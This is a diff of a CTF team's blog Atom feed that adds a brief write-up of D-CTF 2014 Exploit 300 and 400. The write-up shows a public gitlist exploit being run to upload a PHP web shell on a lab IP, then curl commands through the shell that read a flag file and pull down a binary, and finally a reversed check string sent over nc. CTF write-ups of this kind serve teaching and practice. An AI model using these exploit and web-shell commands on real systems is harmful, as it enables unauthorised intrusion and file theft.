@@ -4,7 +4,7 @@
   <title><![CDATA[h3x5p34k CTF Team]]></title>
   <link href="http://h3x5p34k.github.io/atom.xml" rel="self"/>
   <link href="http://h3x5p34k.github.io/"/>
-  <updated>2014-08-31T20:02:55+04:30</updated>
+  <updated>2014-12-11T15:01:11+03:30</updated>
   <id>http://h3x5p34k.github.io/</id>
   <author>
     <name><![CDATA[h3x5p34k]]></name>
@@ -12,6 +12,105 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[D-CTF 2014 Exploit 300 & 400]]></title>
+    <link href="http://h3x5p34k.github.io/blog/2014/10/20/d-ctf-2014-exploit-300/"/>
+    <updated>2014-10-20T20:29:40+03:30</updated>
+    <id>http://h3x5p34k.github.io/blog/2014/10/20/d-ctf-2014-exploit-300</id>
+    <content type="html"><![CDATA[<p>Hi all,</p>
+
+<p>at October 18th D-CTF 2014 was started and we participated in the CTF via irctf team.</p>
+
+<p>TL;DR</p>
+
+<p>In Exploit 300 challenge we are given an IP (10.13.37.33) and some hints :</p>
+
+<blockquote><p>People say that if you&rsquo;re still angry at 80, you&rsquo;re not an angry young man, just a grumpy old git. 10.13.37.33</p>
+
+<p>Hint: gitlist.</p></blockquote>
+
+<!--more-->
+
+
+<p>It seems there should be a repo using gitlist. So I check this url :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://10.13.37.33/gitlist/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I can remember that some time ago a vulnerability existed in gitlist so i Google it and find this :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://www.exploit-db.com/exploits/33929/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There&rsquo;s not too much so i use the exploit and Upload the system($cmd) shell.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python 33929.py http://10.13.37.33/gitlist/redis /var/www/git/cache</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After that i can run any command in www-data permission.</p>
+
+<p>Then after some digging i found the flag and submit it :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl http://10.13.37.33/gitlist/cache/x.php?cmd=cat%20../../../../e3.flag</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>stupid psychopathic git.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok at this point we&rsquo;ve got 300 points.</p>
+
+<p>With a brief looking at Exploit 400 or seeing a file named e4.hint we notice this :</p>
+
+<blockquote><p>You can’t kill a ghost!</p>
+
+<p><strong>Hint:</strong> You need to own Exploit 3.</p></blockquote>
+
+<p>After some searching around a file get my attention : KAKE_exe in /var/www/git/cache</p>
+
+<p>Honestly i dont really know where it comes from So i execute this command :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl http://10.13.37.33/gitlist/cache/x.php?cmd=cat+KAKE_exec | tee KAKE_exec</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and download the file, it looks like an ELF Executable 64-bit file.
+Then i check for some string and verify that it is the ghost exec.</p>
+
+<p>since i notice on the server it removes itslef i use <code>chattr +i</code> on the file so it cannot be removed.
+Then i check the file via nm and objdump and it seems there is a string checking in <strong>_Z7processPv</strong> Function. After reversing  you can see that the input is checking with this string :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>debc0b70b835ec66698008c84d34215b</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And after using this string we&rsquo;ve got the flag :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc 127.0.0.1 8091
+</span><span class='line'>debc0b70b835ec66698008c84d34215b
+</span><span class='line'>SUPERLINUXNINJA</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And there we go another 400 point.</p>
+
+<p>if there is any question, let me know about it.</p>
+
+<p>because of lacking time, i write this write-up briefly, Feel free to ask any question.</p>
+
+<p>Thanks,
+HAMIDx9</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Steganography Unknown CTF]]></title>
